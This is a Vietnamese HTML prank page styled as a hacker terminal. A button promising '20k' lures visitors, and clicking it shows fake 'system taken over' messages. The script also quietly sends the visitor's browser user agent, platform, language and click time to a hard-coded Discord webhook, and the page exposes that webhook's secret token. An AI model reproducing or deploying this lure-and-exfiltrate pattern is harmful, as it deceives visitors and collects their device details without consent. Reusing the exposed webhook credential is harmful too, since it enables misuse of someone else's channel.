<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>💀 Truy cập hệ thống</title>
  <style>
    body {
      background-color: black;
      color: #00FF00;
      font-family: "Courier New", monospace;
      text-align: center;
      padding: 2rem;
      overflow: hidden;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
    }
    #start-btn {
      font-size: 1.2rem;
      padding: 10px 20px;
      background-color: #00ff00;
      border: none;
      color: black;
      cursor: pointer;
      font-weight: bold;
      border-radius: 4px;
    }
    #output {
      margin-top: 2rem;
      text-align: left;
      white-space: pre-wrap;
      z-index: 2;
      position: relative;
    }
    p {
      margin: 0.5rem 0;
    }
    .jack-fly {
      position: fixed;
      top: 40%;
      left: -300px;
      width: 200px;
      z-index: 1;
      animation: flyAcross 10s linear infinite;
      opacity: 0.85;
    }
    @keyframes flyAcross {
      0% { transform: translateX(0); }
      100% { transform: translateX(160vw); }
    }
  </style>
</head>
<body>
  <h1>💀 HỆ THỐNG ĐANG CHỜ KÍCH HOẠT</h1>
  <button id="start-btn">Click vào Nam cho 20k</button>
  <div id="output"></div>
  <img class="jack-fly" src="jack_flying.png" alt="jack">

  <audio id="alert" src="jack.mp3" preload="auto"></audio>

  <script>
    document.getElementById("start-btn").onclick = () => {
      const audio = document.getElementById("alert");
      audio.play().catch(e => console.log("Không thể phát nhạc:", e));

      document.getElementById("start-btn").style.display = "none";

      const now = new Date();
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;

      const text = [
        "💻 Đang truy cập hệ thống...",
        "📡 Kết nối mạng nội bộ...",
        "🔍 Đang dò thiết bị...",
        "✅ Trình duyệt: " + userAgent,
        "✅ Thiết bị: " + platform,
        "🌐 Ngôn ngữ: " + language,
        "💀 Máy tính này đã bị NamDzai điều khiển.",
        "🧠 Gửi dữ liệu về server chủ..."
      ];

      let index = 0;
      const output = document.getElementById("output");

      function typeLine() {
        if (index < text.length) {
          const p = document.createElement("p");
          p.textContent = text[index];
          output.appendChild(p);
          index++;
          setTimeout(typeLine, 1000);
        }
      }

      typeLine();

      fetch("https://discord.com/api/webhooks/1392380082294755469/ZPG-NeK16KST7Wiqui79Avk9Ju7X18aaA_yilLwcqBvebgvW_6zwBwz0e1IRUD1ca3mp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: "HACKER BOT",
          content: `💀 Một người vừa mở trang và nhấn BẮT ĐẦU lúc: ${now.toLocaleString()}\nTrình duyệt: ${userAgent}\nThiết bị: ${platform}\nNgôn ngữ: ${language}`
        })
      }).catch(err => console.log("Không gửi được webhook:", err));
    };
  </script>
</body>
</html>
